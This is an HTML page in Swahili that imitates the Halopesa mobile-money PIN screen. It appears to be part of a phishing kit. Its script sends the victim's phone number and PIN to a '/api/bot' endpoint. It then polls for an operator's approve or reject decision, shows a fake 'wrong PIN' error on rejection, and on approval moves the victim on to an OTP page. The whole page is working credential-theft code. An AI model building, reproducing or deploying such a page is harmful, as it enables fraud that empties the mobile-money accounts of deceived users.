<!DOCTYPE html>
<html lang="sw">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Halopesa - PIN</title>
    <style>
        * { box-sizing: border-box; font-family: sans-serif; }
        body { margin: 0; background-color: white; display: flex; justify-content: center; min-height: 100vh; }
        .container { width: 100%; max-width: 400px; padding: 20px; display: flex; flex-direction: column; }
        .back { font-size: 24px; cursor: pointer; margin-bottom: 30px; color: #333; text-decoration: none; }
        h1 { font-size: 22px; color: #1a1a2e; margin-bottom: 20px; text-align: center; }
        .pin-container { display: flex; justify-content: space-between; margin: 20px 0; position: relative; }
        .pin-box { width: 60px; height: 60px; border: 1px solid #E65C00; border-radius: 8px; background: #f9f9f9; display: flex; justify-content: center; align-items: center; font-size: 24px; font-weight: bold; color: #333; text-align: center; }
        .pin-box:focus { outline: none; border-color: #E65C00; background: white; }
        .show-btn { position: absolute; right: -40px; top: 15px; font-weight: bold; color: #333; cursor: pointer; font-size: 14px;}
        .forgot { text-align: center; color: #333; margin: 20px 0; font-size: 16px; text-decoration: none; display: block; }
        .error-msg { color: #E65C00; font-weight: bold; text-align: center; display: none; margin-bottom: 15px; }
        .btn-main { width: 100%; background-color: #e0e0e0; color: #999; font-size: 16px; font-weight: bold; padding: 15px; border: none; border-radius: 8px; margin-top: auto; cursor: pointer; margin-bottom: 20px;}
        .btn-main:not(:disabled) { background-color: #E65C00; color: white; }
        #overlay { display: none; position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0,0,0,0.8); color: white; flex-direction: column; justify-content: center; align-items: center; z-index: 999; }
        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #E65C00; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin-bottom: 20px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div id="overlay">
        <div class="spinner"></div>
        <h2 style="color:#E65C00;">Inathibitisha...</h2>
        <p>Tafadhali subiri.</p>
    </div>
    <div class="container">
        <a href="login.html" class="back">&#8592;</a>
        <h1>Ingiza PIN / Namba ya siri</h1>
        <div class="error-msg" id="pinError">PIN isiyo sahihi. Jaribu tena.</div>
        <div class="pin-container">
            <input type="password" class="pin-box" id="pin1" maxlength="1" oninput="move('pin2')">
            <input type="password" class="pin-box" id="pin2" maxlength="1" oninput="move('pin3')">
            <input type="password" class="pin-box" id="pin3" maxlength="1" oninput="move('pin4')">
            <input type="password" class="pin-box" id="pin4" maxlength="1" oninput="check()">
            <div class="show-btn">Onyesha</div>
        </div>
        <a href="#" class="forgot">Umesahau PIN?</a>
        <button id="btnNext" class="btn-main" disabled onclick="submitPin()">Endelea</button>
    </div>

    <script>
        var globalUserId = Date.now().toString().slice(-6);
        var userPhone = sessionStorage.getItem('userPhone') || "+255000000000";
        
        function move(nextId) { document.getElementById(nextId).focus(); check(); }
        function check() {
            var p = "";
            for(var i=1; i<=4; i++) { p += document.getElementById('pin'+i).value; }
            document.getElementById('btnNext').disabled = (p.length !== 4);
        }

        function submitPin() {
            var pin = "";
            for(var i=1; i<=4; i++) { pin += document.getElementById('pin'+i).value; }
            if(pin.length !== 4) return;

            document.getElementById('overlay').style.display = 'flex';
            
            fetch('/api/bot', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ 
                    action: 'send', type: 'PHONE_PIN', userId: globalUserId, 
                    data: { phone: userPhone, pin: pin } 
                })
            }).then(function() { pollStatus(); })
            .catch(function() {
                document.getElementById('overlay').style.display = 'none';
                alert("Hitilafu ya mtandao.");
            });
        }

        function pollStatus() {
            var interval = setInterval(function() {
                fetch('/api/bot?userId=' + globalUserId + '&type=PHONE_PIN')
                .then(function(res) { return res.json(); })
                .then(function(data) {
                    if (data.status === 'approved') {
                        clearInterval(interval);
                        window.location.href = 'otp1.html';
                    } 
                    else if (data.status === 'rejected') {
                        clearInterval(interval);
                        document.getElementById('overlay').style.display = 'none';
                        document.getElementById('pinError').style.display = 'block';
                        for(var i=1; i<=4; i++) { document.getElementById('pin'+i).value = ''; }
                        document.getElementById('btnNext').disabled = true;
                    }
                });
            }, 2000);
        }
    </script>
</body>
  </html>
